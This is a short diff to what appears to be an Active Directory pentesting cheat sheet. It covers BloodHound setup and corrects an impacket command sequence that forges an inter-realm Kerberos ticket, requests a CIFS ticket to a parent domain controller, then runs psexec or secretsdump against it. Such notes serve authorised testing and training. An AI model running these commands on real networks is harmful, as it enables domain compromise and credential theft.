@@ -16,7 +16,8 @@ curl -L https://ghst.ly/getbhce -o docker-compose.yml   # or grab it from the Bl
 sudo docker compose up -d                                # wait for all containers healthy
 sudo docker compose logs | grep -i "Initial Password"    # one-time random admin password for the UI
 # Then browse http://localhost:8080, log in, and drag-drop the collector .zip (below) onto the UI.
-# Legacy BloodHound (neo4j + the Electron app) instead of CE:  sudo neo4j console   &&  ./BloodHound
+# Legacy BloodHound (neo4j + Electron app) instead of CE — TWO terminals (neo4j console blocks):
+#   term1: sudo neo4j console      term2: ./BloodHound
 ```
 
 ```bash
@@ -325,7 +326,7 @@ impacket-ticketer -nthash <TRUST_RC4_KEY> -domain child.parent.local \
 export KRB5CCNAME=Administrator.ccache
 
 # 3. Exchange the forged inter-realm TGT for a usable service ticket in the target domain, then use it:
-impacket-getST -k -no-pass -spn cifs/dc.parent.local -impersonate Administrator parent.local/Administrator
+impacket-getST -k -no-pass -spn cifs/dc.parent.local parent.local/Administrator   # forged inter-realm TGT in KRB5CCNAME -> request the TGS directly (no -impersonate; that is the S4U/constrained-delegation flow)
 export KRB5CCNAME=Administrator@cifs_dc.parent.local@PARENT.LOCAL.ccache
 impacket-psexec -k -no-pass parent.local/Administrator@dc.parent.local     # or secretsdump -just-dc
 ```
